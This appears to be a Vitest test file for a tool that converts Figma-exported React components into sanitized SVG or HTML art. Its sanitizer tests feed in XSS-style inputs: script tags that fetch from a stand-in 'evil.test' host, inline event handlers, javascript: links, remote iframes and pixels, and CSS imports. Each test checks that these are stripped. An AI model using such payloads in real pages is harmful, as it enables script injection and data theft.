import { readFileSync } from "node:fs";
import { join } from "node:path";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";

import { extractArt, tsxToArt } from "@/lib/admin/tsx-to-art";
import { sanitizeSvg, SVG_MAX_BYTES } from "@/lib/admin/svg-file";
import { artDocument, sanitizeHtml } from "@/lib/admin/html-file";

/**
 * The Figma door, tested on the founder's actual exports.
 *
 * Both fixtures are files he sent, byte for byte. figma-lightning.tsx
 * draws an `<svg>`; figma-robin.tsx draws spinning divs with little
 * SVG hands inside, uses `useMemo`, and was turned away by the first
 * version of this door with a message that was not even true. If a
 * change stops handling either, this fails - which is the point: "drop
 * it in and it works" is a promise about real files, not about
 * simplified ones written to pass.
 */

const lightning = readFileSync(
  join(process.cwd(), "tests/fixtures/figma-lightning.tsx"),
  "utf8",
);
const robin = readFileSync(
  join(process.cwd(), "tests/fixtures/figma-robin.tsx"),
  "utf8",
);

describe("a Figma .tsx that draws an SVG", () => {
  const result = tsxToArt(lightning, renderToStaticMarkup);

  it("converts the founder's lightning export", () => {
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.kind).toBe("svg");
  });

  it("keeps all 88 sparks and the ring", () => {
    if (!result.ok) throw new Error("conversion failed");
    /* 88 sparks plus the silhouette path the mock draws. */
    expect((result.markup.match(/<path/g) ?? []).length).toBeGreaterThanOrEqual(88);
    expect(result.markup).toContain("<circle");
  });

  it("carries the keyframes INSIDE the drawing", () => {
    if (!result.ok) throw new Error("conversion failed");
    /* They sat in a <style> beside the SVG in the export. Left there,
       the art would arrive frozen. */
    expect(result.markup).toContain("@keyframes lf-a");
    expect(result.markup).toContain("@keyframes ring-breathe");
    expect(result.markup.indexOf("@keyframes")).toBeGreaterThan(
      result.markup.indexOf("<svg"),
    );
  });

  it("is a standalone document, namespace and all", () => {
    if (!result.ok) throw new Error("conversion failed");
    expect(result.markup.startsWith("<svg")).toBe(true);
    expect(result.markup).toContain('xmlns="http://www.w3.org/2000/svg"');
    expect(result.markup.endsWith("</svg>")).toBe(true);
  });
});

/**
 * The export that broke the door. The founder saw "That component drew
 * no SVG. A cosmetic has to be an <svg>, not a div of HTML." Two things
 * were wrong with that: the file DID contain SVG, and the real failure
 * was that it never rendered at all, because the require shim handed
 * out an object with only createElement on it and the file's first line
 * is `import { useMemo } from "react"`.
 */
describe("a Figma .tsx that draws HTML", () => {
  const result = tsxToArt(robin, renderToStaticMarkup);

  it("converts the founder's Robin export", () => {
    expect(result.ok).toBe(true);
  });

  it("is kept as HTML, not butchered into the SVG bits inside it", () => {
    if (!result.ok) throw new Error("conversion failed");
    /* Slicing first-<svg> to last-</svg> would have thrown away the
       rings and kept the hands. The rings are the cosmetic. */
    expect(result.kind).toBe("html");
    expect(result.markup).toContain("conic-gradient");
    expect(result.markup).toContain("<svg");
  });

  it("brings its keyframes with it", () => {
    if (!result.ok) throw new Error("conversion failed");
    expect(result.markup).toContain("@keyframes fleurCycle");
    expect(result.markup).toContain("@keyframes ringSpin");
  });

  it("draws all eight arms, so the hooks really ran", () => {
    if (!result.ok) throw new Error("conversion failed");
    /* useMemo builds the arm list. If React were still a stub, this
       file would throw instead of drawing anything. */
    expect((result.markup.match(/animation:fleurCycle/g) ?? []).length).toBe(8);
  });
});

describe("what the converter refuses", () => {
  it("refuses a file with no default export", () => {
    const orphan = tsxToArt(
      `export function Thing() { return <svg />; }`,
      renderToStaticMarkup,
    );
    expect(orphan).toEqual({ ok: false, reason: "no-default-export" });
  });

  it("refuses a file that USES anything but React", () => {
    /* A file that actually reaches for the filesystem cannot run: the
       require shim hands out React and nothing else. */
    const greedy = tsxToArt(
      `import fs from "node:fs";
       export default function App() {
         return <svg><title>{String(fs.readdirSync("/"))}</title></svg>;
       }`,
      renderToStaticMarkup,
    );
    expect(greedy).toEqual({ ok: false, reason: "threw" });
  });

  it("shrugs off an import it never uses", () => {
    /* The transform elides unused imports, so this is a file that
       imports nothing at run time. Harmless, and it should convert. */
    const tidy = tsxToArt(
      `import fs from "node:fs";\nexport default function App() { return <svg><rect /></svg>; }`,
      renderToStaticMarkup,
    );
    expect(tidy.ok).toBe(true);
  });

  it("refuses a component that renders nothing", () => {
    const empty = tsxToArt(
      `export default function App() { return null; }`,
      renderToStaticMarkup,
    );
    expect(empty).toEqual({ ok: false, reason: "nothing-drawn" });
  });

  it("takes hooks in its stride, which is the whole fix", () => {
    const hooked = tsxToArt(
      `import { useMemo, useState, useRef } from "react";
       export default function App() {
         const n = useMemo(() => 3, []);
         const [on] = useState(true);
         const box = useRef(null);
         return <div ref={box}>{on ? n : 0}</div>;
       }`,
      renderToStaticMarkup,
    );
    expect(hooked.ok).toBe(true);
  });
});

describe("the drawing is scrubbed before anybody sees it", () => {
  it("keeps the lightning intact", () => {
    const converted = tsxToArt(lightning, renderToStaticMarkup);
    if (!converted.ok) throw new Error("conversion failed");

    const clean = sanitizeSvg(converted.markup);
    expect(clean.ok).toBe(true);
    if (!clean.ok) return;
    expect((clean.svg.match(/<path/g) ?? []).length).toBeGreaterThanOrEqual(88);
    expect(clean.svg).toContain("@keyframes lf-a");
    /* Local references to the filters and gradients must survive. */
    expect(clean.svg).toContain("url(#glow-xl)");
  });

  it("strips scripts, handlers and anything that leaves our origin", () => {
    const nasty = sanitizeSvg(
      `<svg xmlns="http://www.w3.org/2000/svg">` +
        `<script>fetch("https://evil.test/steal")</script>` +
        `<circle cx="1" cy="1" r="1" onload="alert(1)" onclick='alert(2)'/>` +
        `<image href="https://evil.test/pixel.png"/>` +
        `<a xlink:href="javascript:alert(3)">x</a>` +
        `<foreignObject><body>anything</body></foreignObject>` +
        `<use href="#local-and-fine"/>` +
        `</svg>`,
    );

    expect(nasty.ok).toBe(true);
    if (!nasty.ok) return;

    expect(nasty.svg).not.toContain("<script");
    expect(nasty.svg).not.toContain("onload");
    expect(nasty.svg).not.toContain("onclick");
    expect(nasty.svg).not.toContain("evil.test");
    expect(nasty.svg).not.toContain("javascript:");
    expect(nasty.svg).not.toContain("foreignObject");
    /* The one reference that is fine stays. */
    expect(nasty.svg).toContain('href="#local-and-fine"');
  });

  it("refuses what is not a drawing at all", () => {
    expect(sanitizeSvg("")).toEqual({ ok: false, reason: "empty" });
    expect(sanitizeSvg("<html><body>hi</body></html>")).toEqual({
      ok: false,
      reason: "not-svg",
    });
    const huge = `<svg xmlns="http://www.w3.org/2000/svg">${"x".repeat(SVG_MAX_BYTES)}</svg>`;
    expect(sanitizeSvg(huge)).toEqual({ ok: false, reason: "too-big" });
  });
});

describe("HTML art is scrubbed and then boxed in", () => {
  it("keeps the Robin ring intact", () => {
    const converted = tsxToArt(robin, renderToStaticMarkup);
    if (!converted.ok) throw new Error("conversion failed");

    const clean = sanitizeHtml(converted.markup);
    expect(clean.ok).toBe(true);
    if (!clean.ok) return;
    expect(clean.html).toContain("conic-gradient");
    expect(clean.html).toContain("@keyframes fleurCycle");
    expect((clean.html.match(/animation:fleurCycle/g) ?? []).length).toBe(8);
  });

  it("strips everything that executes, embeds or fetches", () => {
    const nasty = sanitizeHtml(
      `<div>` +
        `<script>fetch("https://evil.test/steal")</script>` +
        `<span onmouseover="alert(1)">hi</span>` +
        `<iframe src="https://evil.test"></iframe>` +
        `<link rel="stylesheet" href="https://evil.test/x.css">` +
        `<img src="https://evil.test/pixel.png">` +
        `<a href="javascript:alert(2)">x</a>` +
        `<style>@import url("https://evil.test/f.css");` +
        `.a{background:url(https://evil.test/bg.png)}</style>` +
        `</div>`,
    );

    expect(nasty.ok).toBe(true);
    if (!nasty.ok) return;

    expect(nasty.html).not.toContain("<script");
    expect(nasty.html).not.toContain("<iframe");
    expect(nasty.html).not.toContain("<link");
    expect(nasty.html).not.toContain("onmouseover");
    expect(nasty.html).not.toContain("evil.test");
    expect(nasty.html).not.toContain("javascript:");
    expect(nasty.html).not.toContain("@import");
  });

  it("refuses markup with nothing left in it", () => {
    expect(sanitizeHtml("")).toEqual({ ok: false, reason: "empty" });
    expect(sanitizeHtml("<script>alert(1)</script>")).toEqual({
      ok: false,
      reason: "nothing-left",
    });
  });

  it("ships inside a document that cannot fetch anything", () => {
    /* The third lock, after the scrubber and the sandbox: even markup
       that got past both cannot load a font or a tracking pixel. */
    const doc = artDocument("<div>art</div>");
    expect(doc).toContain("default-src 'none'");
    expect(doc).toContain("style-src 'unsafe-inline'");
    expect(doc).toContain("img-src data:");
    expect(doc).toContain("background:transparent");
  });

  it("the renderer never gives HTML art permission to run code", () => {
    const film = readFileSync(
      join(process.cwd(), "src/components/players/cosmetic-film.tsx"),
      "utf8",
    );
    expect(film).toContain('sandbox=""');
    /* Not "no allow-scripts anywhere" - the comment beside it says the
       words. What must not exist is a sandbox that grants them. */
    expect(film).not.toMatch(/sandbox=\{?["'][^"']*allow-scripts/);
  });
});

describe("the shipped lightning ring", () => {
  it("matches what its source converts to today", () => {
    /* The committed SVG is generated from src/cosmetics by
       `npm run cosmetics:svg`. Editing the source without rebuilding
       would ship art nobody has seen; this is what catches it. */
    const source = readFileSync(
      join(process.cwd(), "src/cosmetics/ring-lightning.tsx"),
      "utf8",
    );
    const shipped = readFileSync(
      join(process.cwd(), "public/cosmetics/ring-lightning.svg"),
      "utf8",
    );

    const rebuilt = tsxToArt(source, renderToStaticMarkup);
    expect(rebuilt.ok).toBe(true);
    if (!rebuilt.ok) return;

    const clean = sanitizeSvg(rebuilt.markup);
    expect(clean.ok).toBe(true);
    if (!clean.ok) return;

    expect(shipped).toBe(clean.svg);
  });

  it("has a transparent middle, so a face fits in it", () => {
    const shipped = readFileSync(
      join(process.cwd(), "public/cosmetics/ring-lightning.svg"),
      "utf8",
    );
    /* The Figma frame's page background and placeholder person were
       removed on the way in. Their fills are the tell. */
    expect(shipped).not.toContain("url(#page-bg)");
    expect(shipped).not.toContain("url(#profile-fill)");
    expect(shipped).not.toContain("#252566");
  });
});

describe("extractArt", () => {
  it("finds a drawing inside a wrapper and moves the styles in", () => {
    const art = extractArt(
      `<style>@keyframes x{}</style><svg viewBox="0 0 1 1"><rect/></svg>`,
    );
    expect(art?.kind).toBe("svg");
    expect(art?.markup).toContain("@keyframes x");
    expect(art?.markup.startsWith("<svg")).toBe(true);
  });

  it("leaves styles that were already inside alone", () => {
    const art = extractArt(`<svg><style>@keyframes y{}</style><rect/></svg>`);
    expect((art?.markup.match(/@keyframes y/g) ?? []).length).toBe(1);
  });

  it("calls a div of HTML what it is instead of refusing it", () => {
    const art = extractArt(`<div class="ring">nothing svg here</div>`);
    expect(art?.kind).toBe("html");
    expect(art?.markup).toContain("<div");
  });

  it("peels the centring wrapper off a lone drawing", () => {
    /* Figma Make centres its art in a div. The wrapper only ever
       positions the art, and the cosmetic layer positions it again. */
    const art = extractArt(`<div style="display:grid"><svg><rect/></svg></div>`);
    expect(art?.kind).toBe("svg");
    expect(art?.markup.startsWith("<svg")).toBe(true);
  });

  it("keeps a wrapper with more than a drawing in it as HTML", () => {
    /* This is the Robin shape: rings and hands together. Peeling here
       would throw away everything that is not the svg. */
    const art = extractArt(`<div><i class="ring"></i><svg><rect/></svg></div>`);
    expect(art?.kind).toBe("html");
    expect(art?.markup).toContain('class="ring"');
  });

  it("keeps two sibling drawings as HTML rather than picking one", () => {
    const art = extractArt(`<div><svg><rect/></svg><svg><circle/></svg></div>`);
    expect(art?.kind).toBe("html");
  });

  it("takes the page background off the outermost element", () => {
    /* Figma Make builds a demo page. A flat fill behind everything is
       the page, and as a cosmetic it is an opaque square on a face. */
    const art = extractArt(
      `<div style="position:relative;background:#07050f"><i/></div>`,
    );
    expect(art?.markup).not.toContain("#07050f");
    expect(art?.markup).toContain("position:relative");
  });

  it("keeps a gradient on the outermost element, because that IS the art", () => {
    const art = extractArt(
      `<div style="background:conic-gradient(#4c0099,#a855f7)"><i/></div>`,
    );
    expect(art?.markup).toContain("conic-gradient");
  });

  it("leaves backgrounds on inner elements alone", () => {
    const art = extractArt(`<div><i style="background:#111"></i></div>`);
    expect(art?.markup).toContain("#111");
  });

  it("puts loose styles in front of HTML art, where the frame finds them", () => {
    const art = extractArt(`<style>@keyframes z{}</style><div class="a"></div>`);
    expect(art?.kind).toBe("html");
    expect(art?.markup.startsWith("<style>")).toBe(true);
    expect(art?.markup).toContain("@keyframes z");
  });

  it("says so when nothing was drawn", () => {
    expect(extractArt("")).toBeNull();
    expect(extractArt("<style>.a{}</style>")).toBeNull();
  });
});
